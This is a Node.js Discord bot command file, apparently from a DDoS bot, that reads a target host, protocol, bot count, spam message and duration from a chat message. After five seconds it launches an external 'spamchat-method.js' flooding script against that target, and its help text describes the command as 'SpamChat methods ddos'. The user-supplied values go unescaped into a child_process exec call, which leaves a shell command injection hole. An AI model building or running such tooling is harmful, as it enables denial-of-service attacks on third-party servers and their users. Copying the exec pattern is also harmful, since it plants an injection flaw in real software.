const Discord = require("discord.js");

exports.run = async (client, message, args) => {

    const host = message.content.split(" ")[1];
    const protocol = message.content.split(" ")[2];
    const botcount = message.content.split(" ")[3];
    const spamMessage = message.content.split(" ")[4];
    const time = message.content.split(" ")[5];
    const ayarlar = require('../ayarlar.json');
    var room = ayarlar.commandroom;
    const roleName = message.member.roles.cache.find(r => r.name === "[attack-plan]");

    if (message.channel.id != room) {
        return;
    }

    if (!args[0] || !args[1] || !args[2] || !args[3] || !args[4]) {
        return;
    }

    if (roleName) {
        return;
    }

    setTimeout(() => {
        var exec = require('child_process').exec;
        exec(`node spamchat-method.js --ip ${host} --bps ${botcount} --chat ${spamMessage} --time ${time} --protocol ${protocol}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing attack: ${error}`);
            }
        });

        console.log('Launched Attack By ID:' + message.guild.id);
    }, 5000); // Wait for 5 seconds before executing the attack
};

exports.conf = {
    enabled: true,
    guildOnly: false,
    aliases: ['spamchat'],
    permLevel: 0
};

exports.help = {
    name: 'spamchat',
    description: 'SpamChat methods ddos',
    usage: 'spamchat'
};
